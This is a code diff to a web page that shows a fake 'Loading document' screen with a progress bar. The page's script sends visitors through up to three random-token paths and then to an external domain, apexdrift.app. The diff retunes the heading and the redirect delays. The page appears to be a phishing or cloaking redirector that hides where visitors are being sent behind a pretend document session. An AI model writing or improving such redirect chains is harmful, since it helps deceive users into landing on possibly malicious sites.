@@ -145,7 +145,7 @@
     <main class="loading-card" aria-live="polite">
       <div class="document-icon" aria-hidden="true"></div>
       <p class="status"><span class="spinner" aria-hidden="true"></span> Loading document</p>
-      <h1>Preparing your request</h1>
+      <h1>Document loading</h1>
       <p>Please keep this page open while the document session is prepared.</p>
       <div class="progress" aria-hidden="true"><span id="loading-progress"></span></div>
     </main>
@@ -153,7 +153,8 @@
     <script>
       (function () {
         var finalUrl = "https://liberalization652.apexdrift.app/448orthodoxy/";
-        var loadingDelayMs = 7000;
+        var initialLoadingDelayMs = 7000;
+        var randomRedirectDelayMs = 2000;
         var maxRandomRedirects = 3;
         var minRandomPathLength = 10;
         var storageKey = "redirectStep";
@@ -161,6 +162,8 @@
         var tokenPattern = new RegExp("^/[A-Za-z0-9]{" + minRandomPathLength + ",}/?$");
         var currentPath = window.location.pathname.replace(/\/+$/, "");
         var progressBar = document.getElementById("loading-progress");
+        var isInitialLoad = currentPath === "" || currentPath === "/index.html";
+        var activeDelayMs = isInitialLoad ? initialLoadingDelayMs : randomRedirectDelayMs;
         var startedAt = Date.now();
         var requestFrame = window.requestAnimationFrame || function (callback) {
           return window.setTimeout(callback, 16);
@@ -177,7 +180,7 @@
         }
 
         function isInitialPath() {
-          return currentPath === "" || currentPath === "/index.html";
+          return isInitialLoad;
         }
 
         function redirectToNextStep() {
@@ -195,7 +198,7 @@
 
         function updateProgress() {
           var elapsedMs = Date.now() - startedAt;
-          var progress = Math.min(elapsedMs / loadingDelayMs, 1);
+          var progress = Math.min(elapsedMs / activeDelayMs, 1);
 
           progressBar.style.width = Math.round(progress * 100) + "%";
 
@@ -208,17 +211,15 @@
           if (!tokenPattern.test(window.location.pathname)) {
             window.sessionStorage.setItem(storageKey, "0");
           }
-
-          redirectToNextStep();
-          return;
+        } else {
+          window.sessionStorage.setItem(storageKey, "0");
         }
 
-        window.sessionStorage.setItem(storageKey, "0");
         updateProgress();
         window.setTimeout(function () {
           progressBar.style.width = "100%";
           redirectToNextStep();
-        }, loadingDelayMs);
+        }, activeDelayMs);
       }());
     </script>
   </body>
